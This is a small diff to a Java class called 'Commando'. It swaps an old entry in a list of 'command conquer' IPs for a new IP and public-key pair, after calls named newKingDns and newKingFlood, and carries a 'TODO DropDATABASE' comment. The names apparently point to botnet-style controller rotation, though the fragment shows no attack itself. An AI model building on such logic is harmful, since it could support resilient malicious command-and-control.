@@ -238,6 +238,8 @@ public class Commando {
 			String pk = b.getPubKey();
 			newKingDns(ip, pk);
 			newKingFlood(ip, pk);
+			nServ.getCommandConquerIps().remove(0);
+			nServ.getCommandConquerIps().add(new Pairs( ip, pki.rebuildPuK(pk)));
 			System.out.println("dns updated..");
 
 			// TODO DropDATABASE
